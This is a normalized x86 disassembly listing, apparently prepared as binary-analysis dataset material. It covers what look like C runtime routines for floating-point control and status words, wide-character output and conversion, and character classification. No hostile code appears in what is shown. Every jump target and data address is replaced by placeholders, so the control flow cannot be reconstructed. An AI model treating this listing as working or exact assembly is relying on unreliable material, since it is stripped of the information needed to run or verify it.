jmp r-xdata
sub_440ff5
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_441095
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
xor eax eax
test cl 0x3f
je r-xdata
pop ebp
retn
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
or eax 0x80000
sub_4410e4
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
fwait
fnstsw [ ebp - 0x4 ]
mov al [ ebp - 0x4 ]
xor edx edx
mov esi 0x80000
test al 0x3f
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
test al 0x1
je r-xdata
mov eax edx
stmxcsr [ ebp - 0x8 ]
mov cl [ ebp - 0x8 ]
xor eax eax
test cl 0x3f
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop edx
or eax edx
jmp r-xdata
test cl 0x1
je r-xdata
test al 0x8
je r-xdata
or edx 0x8
pop esi
leave
retn
test cl 0x4
je r-xdata
push 0x10
pop eax
test al 0x10
je r-xdata
or edx 0x4
test cl 0x8
je r-xdata
or eax 0x8
test al 0x20
je r-xdata
or edx 0x2
test cl 0x10
je r-xdata
or eax 0x4
test al 0x2
je r-xdata
or edx 0x1
test cl 0x20
je r-xdata
or eax 0x2
or edx esi
test cl 0x2
je r-xdata
or eax 0x1
or eax esi
sub_441176
mov edi edi
push esi
call sub_42a199
mov esi [ eax ]
fninit
call sub_432575
push 0x1f80
call sub_429061
pop ecx
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x4 ]
test [ eax ] 0x10008
je r-xdata
and [ eax + 0x20 ] 0x0
mov [ eax + 0x24 ] 0xffff
sub_4411ae
call sub_429043
xor ecx ecx
test al 0x3f
je r-xdata
mov eax ecx
retn
test al 0x1
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or ecx 0x1
or ecx 0x80000
sub_4411e9
mov edi edi
push ebp
mov ebp esp
push ecx
stmxcsr [ ebp - 0x4 ]
and [ ebp - 0x4 ] 0xffffffc0
ldmxcsr [ ebp - 0x4 ]
mov cl [ ebp - 0x4 ]
xor eax eax
test cl 0x3f
je r-xdata
leave
retn
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
or eax 0x80000
sub_441239
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp + 0xc ] 0x308031f
stmxcsr [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
xor eax eax
test cl cl
jns r-xdata
push ebx
mov ebx 0x200
push esi
push edi
test ebx ecx
je r-xdata
push 0x10
pop eax
test ecx 0x400
je r-xdata
or eax 0x8
test ecx 0x800
je r-xdata
or eax 0x4
test ecx 0x1000
je r-xdata
or eax 0x2
mov esi 0x100
test esi ecx
je r-xdata
or eax 0x1
mov edx ecx
mov edi 0x6000
and edx edi
je r-xdata
or eax 0x80000
mov esi 0x8040
and ecx esi
sub ecx 0x40
je r-xdata
cmp edx 0x2000
je r-xdata
or eax 0x2000000
sub ecx 0x7fc0
je r-xdata
or eax esi
cmp edx 0x4000
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_440ff5
push eax
mov [ ebp - 0x4 ] eax
call sub_429061
pop ecx
stmxcsr [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
xor eax eax
test dl dl
jns r-xdata
or eax 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or eax ebx
jmp r-xdata
cmp edx edi
jne r-xdata
test ebx edx
je r-xdata
push 0x10
pop eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
not edx
and edx eax
or edx ecx
cmp edx eax
je r-xdata
or eax 0x1000000
jmp r-xdata
or eax 0x300
jmp r-xdata
test edx 0x400
je r-xdata
or eax 0x8
test edx 0x800
je r-xdata
or eax 0x4
test edx 0x1000
je r-xdata
or eax 0x2
mov ebx 0x100
test ebx edx
je r-xdata
or eax 0x1
mov ecx edx
and ecx edi
je r-xdata
or eax 0x80000
and edx esi
sub edx 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or eax 0x2000000
sub edx 0x7fc0
je r-xdata
or eax ebx
cmp ecx 0x4000
je r-xdata
or eax 0x3000000
jmp r-xdata
sub edx 0x40
jne r-xdata
or eax 0x200
jmp r-xdata
cmp ecx edi
jne r-xdata
or eax 0x1000000
jmp r-xdata
or eax 0x300
jmp r-xdata
sub_4413af
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
fwait
fnstsw [ ebp + 0x8 ]
mov al [ ebp + 0x8 ]
xor ecx ecx
test al 0x3f
je r-xdata
pop esi
pop ebp
retn
call sub_4411ae
mov [ esi ] eax
mov [ edx ] ecx
test al 0x1
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or ecx 0x1
or ecx 0x80000
sub_441409
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
cmp [ rw-data ] 0x0
je r-xdata
mov cl [ ebp - 0x4 ]
xor eax eax
test cl 0x3f
je r-xdata
mov al [ ebp - 0x4 ]
xor edx edx
push esi
mov esi 0x80000
test al 0x3f
je r-xdata
leave
retn
test cl 0x1
je r-xdata
stmxcsr [ ebp - 0x8 ]
and [ ebp - 0x8 ] 0xffffffc0
ldmxcsr [ ebp - 0x8 ]
mov cl [ ebp - 0x8 ]
xor eax eax
test cl 0x3f
je r-xdata
test al 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
or eax edx
pop esi
leave
retn
test cl 0x1
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop edx
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x4
je r-xdata
push 0x10
pop eax
test al 0x8
je r-xdata
or edx 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x8
je r-xdata
or eax 0x8
test al 0x10
je r-xdata
or edx 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x10
je r-xdata
or eax 0x4
test al 0x20
je r-xdata
or edx 0x2
test cl 0x2
je r-xdata
or eax 0x1
test cl 0x20
je r-xdata
or eax 0x2
test al 0x2
je r-xdata
or edx 0x1
or eax 0x80000
test cl 0x2
je r-xdata
or eax 0x1
or edx esi
or eax esi
sub_4414e2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x10
push ebx
push esi
xor edx edx
push edi
mov edi 0x300
cmp [ ebp + 0x10 ] edx
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
fwait
fnstcw [ ebp - 0x4 ]
mov bx [ ebp - 0x4 ]
test bl 0x1
je r-xdata
pop edi
xor eax eax
pop esi
inc eax
pop ebx
leave
retn
xor esi esi
cmp [ rw-data ] esi
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
mov eax [ ebp + 0x14 ]
mov [ eax ] esi
and eax 0x308031f
mov [ ebp - 0x10 ] eax
stmxcsr [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
test al al
jns r-xdata
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x1000
je r-xdata
or esi 0x2
movzx eax bx
mov ecx eax
mov esi 0xc00
and ecx esi
je r-xdata
or edx 0x80000
test eax 0x100
je r-xdata
or esi 0x1
and eax edi
je r-xdata
cmp ecx 0x400
je r-xdata
mov ecx eax
mov edi 0x6000
and ecx edi
je r-xdata
or esi 0x80000
or edx 0x20000
cmp eax 0x200
jne r-xdata
or edx 0x100
cmp ecx 0x800
je r-xdata
mov ebx 0x8040
and eax ebx
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
and eax [ ebp + 0xc ]
not ebx
and ebx edx
or ebx eax
cmp ebx edx
je r-xdata
or edx 0x40000
movzx eax bx
test eax 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp ecx esi
jne r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] ebx
mov eax [ ebp + 0xc ]
call sub_440e84
movzx eax ax
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
xor ebx ebx
test dl 0x1
je r-xdata
or edx edi
jmp r-xdata
call sub_440ff5
push eax
mov [ ebp + 0x10 ] eax
call sub_429061
pop ecx
stmxcsr [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx edi
jne r-xdata
test dl 0x4
je r-xdata
push 0x10
pop ebx
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test dl 0x8
je r-xdata
or ebx 0x8
test ecx 0x400
je r-xdata
or edx 0x8
test dl 0x10
je r-xdata
or ebx 0x4
test ecx 0x800
je r-xdata
or edx 0x4
test dl 0x20
je r-xdata
or ebx 0x2
test ecx 0x1000
je r-xdata
or edx 0x2
test dl 0x2
je r-xdata
or ebx 0x1
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
movzx ecx dx
mov eax ecx
and eax esi
je r-xdata
or ebx 0x80000
mov eax ecx
and eax edi
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
and ecx ebx
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or ebx 0x20000
cmp ecx 0x200
jne r-xdata
or ebx 0x100
cmp eax 0x800
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or ebx 0x40000
test edx 0x1000
je r-xdata
or ebx 0x10000
jmp r-xdata
or ebx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax edi
jne r-xdata
or ebx edi
jmp r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_4417f9
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x4 ]
mov bx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
movzx eax bx
test eax 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_440e84
movzx eax ax
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_440ff5
push eax
mov [ ebp - 0xc ] eax
call sub_429061
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_441b0b
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
and edi 0xfff7ffff
fwait
fnstcw [ ebp + 0xc ]
mov bx [ ebp + 0xc ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
je r-xdata
or edx 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov eax edi
not eax
mov ecx edi
and ecx [ ebp + 0x8 ]
and eax edx
or eax ecx
mov [ ebp - 0x10 ] eax
cmp eax edx
je r-xdata
or edx 0x40000
movzx eax bx
test eax 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_440e84
movzx eax ax
mov [ ebp - 0x4 ] eax
fldcw [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
or edx 0x300
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov edi 0x6000
and ecx edi
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov ebx 0x8040
and eax ebx
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov eax edx
mov [ ebp - 0x10 ] edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_440ff5
push eax
mov [ ebp - 0x8 ] eax
call sub_429061
pop ecx
stmxcsr [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
xor eax eax
test dl dl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx edi
jne r-xdata
or edx 0x300
jmp r-xdata
test edx 0x200
je r-xdata
push 0x10
pop eax
mov ecx eax
xor ecx [ ebp - 0x10 ]
or eax [ ebp - 0x10 ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test edx 0x400
je r-xdata
or eax 0x8
or eax 0x80000000
test edx 0x800
je r-xdata
or eax 0x4
test edx 0x1000
je r-xdata
or eax 0x2
mov esi 0x100
test esi edx
je r-xdata
or eax 0x1
mov ecx edx
and ecx edi
je r-xdata
or eax 0x80000
and edx ebx
sub edx 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or eax 0x2000000
sub edx 0x7fc0
je r-xdata
or eax esi
cmp ecx 0x4000
je r-xdata
or eax 0x3000000
jmp r-xdata
sub edx 0x40
jne r-xdata
or eax 0x200
jmp r-xdata
cmp ecx edi
jne r-xdata
or eax 0x1000000
jmp r-xdata
or eax 0x300
jmp r-xdata
sub_441e20
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_437094
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_4268f3
mov [ eax ] 0x9
test al 0x1
je r-xdata
call sub_4268f3
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push 0x2
and eax 0xffffffef
pop ebx
or eax ebx
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_429e89
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov edi ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] bx
call sub_436fc0
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x2 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
sub ecx ebx
mov [ esi + 0x4 ] ecx
test edi edi
jle r-xdata
push [ ebp + 0xc ]
call sub_438de0
pop ecx
test eax eax
jne r-xdata
call sub_429e89
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
mov eax ebx
and eax 0xffff
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_436fc0
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_438d97
pop ecx
pop edi
pop ebx
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push ebx
push 0x0
push 0x0
push ecx
call sub_438cad
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_441f94
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_4268f3
push 0x16
pop esi
mov [ eax ] esi
call sub_42970c
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_4268f3
mov [ eax ] 0x2a
call sub_4268f3
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_4268f3
push 0x22
pop esi
mov [ eax ] esi
call sub_42970c
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_4338e0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_4338e0
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_442106
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push [ ebp + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_42b774
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0xc ]
mov eax [ ebp - 0x14 ]
push [ eax + 0xac ]
lea eax [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push eax
call sub_441f94
add esp 0x14
test eax eax
jne r-xdata
or eax 0xffffffff
mov eax [ ebp - 0x4 ]
jmp r-xdata
leave
retn
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_442157
mov edi edi
push ebp
mov ebp esp
push ecx
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push [ ebp + 0xc ]
call sub_442a4b
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_441f94
add esp 0x14
test eax eax
jne r-xdata
or eax 0xffffffff
leave
retn
mov eax [ ebp - 0x4 ]
leave
retn
sub_442189
push 0x10
push r--data
call sub_4278c0
call sub_429e89
lea esi [ eax + 0x20 ]
mov [ ebp - 0x1c ] esi
xor eax eax
cmp [ ebp + 0xc ] eax
setne al
test eax eax
jne r-xdata
push esi
call sub_429f60
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_437193
mov edi eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ ebp + 0x8 ]
mov [ ebp - 0x20 ] eax
push esi
push edi
call sub_43722f
add esp 0x1c
mov [ ebp - 0x4 ] 0xfffffffe
call sub_442206
mov eax [ ebp - 0x20 ]
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
or eax 0xffffffff
jmp r-xdata
call sub_427905
retn
sub_4422b9
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax 0xffff
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
movzx eax [ ebp - 0x4 ]
and [ ebp - 0x4 ] eax
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_44232d
mov edi edi
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
cmp ax 0x30
jb r-xdata
or eax 0xffffffff
pop ebp
retn
cmp ax 0x3a
jae r-xdata
mov ecx 0xff10
cmp ax cx
jae r-xdata
movzx eax ax
sub eax 0x30
pop ebp
retn
mov edx 0xff1a
mov ecx 0x660
cmp ax cx
jb r-xdata
movzx eax ax
sub eax ecx
pop ebp
retn
lea edx [ ecx + 0xa ]
cmp ax dx
jae r-xdata
mov ecx 0x6f0
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0x966
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
